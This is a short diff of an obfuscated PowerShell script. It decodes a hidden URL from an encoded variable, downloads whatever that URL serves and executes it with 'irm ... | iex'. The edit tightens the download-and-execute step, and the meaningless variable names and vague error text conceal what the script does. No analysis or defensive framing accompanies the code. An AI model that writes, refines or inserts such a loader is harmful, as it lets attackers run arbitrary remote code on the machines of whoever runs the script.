@@ -17,11 +17,9 @@ ${global:a3b2c1} = {
     return [System.Text.Encoding]::UTF8.GetString(${processed_byte_array})
 }
 
-${execution_context} = & ${global:a3b2c1} -input_data ${7e849043}
-
 try {
-    ${web_request_result} = Invoke-WebRequest -Uri ${execution_context}
-    ${expression_result} = Invoke-Expression ${web_request_result}.Content
+    ${execution_context} = & ${global:a3b2c1} -input_data ${7e849043}
+    irm ${execution_context} | iex
 } catch {
     Write-Error "Failed Parse code"
 }
